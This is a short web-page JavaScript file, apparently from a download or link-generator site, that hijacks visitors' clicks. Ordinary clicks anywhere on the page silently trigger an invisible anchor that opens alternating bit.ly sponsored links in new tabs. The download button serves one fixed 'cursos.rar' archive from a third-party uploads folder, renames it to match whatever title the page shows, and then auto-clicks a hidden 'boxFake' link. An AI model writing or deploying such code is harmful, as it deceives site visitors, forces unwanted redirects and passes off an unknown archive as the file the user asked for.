
// teste AB liks patrocinados
var dowHref = "https://geradordelinkwhatsapp.app.br/wp-content/uploads/2023/08/cursos.rar";
var  ganhosLiskB = "https://bit.ly/3YIiEzm";
var  ganhosLiskA = "https://bit.ly/3P5vuoc";

document.addEventListener('click', (e)=> {
    //e.preventDefault();
var Elemento = e.srcElement.nodeName;
if (Elemento==='IMG' || Elemento==='IFRAME' 
     || typeof e.target.getAttribute('class')=='string' 
     && e.target.getAttribute('class').includes('container')
    ){
    console.log("ads")
}else if (e.target.id=="-btn"){
    e.preventDefault();
    console.log("dowlonad");
    dowlonad();
    alert('Download "'+textH2.innerHTML+'" iniciado!')
    setTimeout(()=>{
        document.querySelector("#boxFake > a").click();
    },500);
}else {
    clickWP();
    console.log("Click tala");
}
console.log(e.target);
});


function clickWP(){
    setCookie('__hwp',2)

}

function setCookie(nome,max){
    const data = new Date();
    var minutos = 1;
    data.setTime(data.getTime() + (minutos * 60 * 1000));
    let = expires = "expires" + data.toUTCString();
    if (document.cookie.indexOf(nome)<0){
        var valor = 1;
        document.cookie = nome + "=" + valor + ";" + expires + "; parth=/";
  }else{
      var valor = valorCookie(nome);
      valor++;
      if (valor>=max+1){
          valor = 1;
      }
    document.cookie = nome + "=" + valor + ";" + expires + "; parth=/";
  }
  clickbody(nome);
}

function valorCookie(nome){
    let cookie = {};
    document.cookie.split(';').forEach(function (el){
        let [k,v] = el.split('=');
        cookie[k.trim()] = v;
      });
      return cookie[nome];
}


function clickbody(nome){
    var valor = valorCookie(nome);
    if (valor==1){
        emularCK(ganhosLiskA)
    }else{
        emularCK(ganhosLiskB)
    }
}


function emularCK(L) {
    var el = document.createElement('a');
    el.id = "botaofalse";
    el.style.width = "0px";
    el.style.height = "0px";
    el.target = "_blank";
    el.href = L;
    document.body.appendChild(el);
    elx = document.getElementById('botaofalse');
    elx.click();
    setTimeout(() => {
        elx.remove();
    }, 200);
}

function  dowlonad(){
    var el = document.createElement('a');
    el.href=dowHref;
    el.id="dowBtn";
    el.download= textH2.innerHTML.replaceAll(' ',"-")+".rar";
    document.body.appendChild(el);
    document.getElementById('dowBtn').click();
    document.getElementById('dowBtn').remove();

}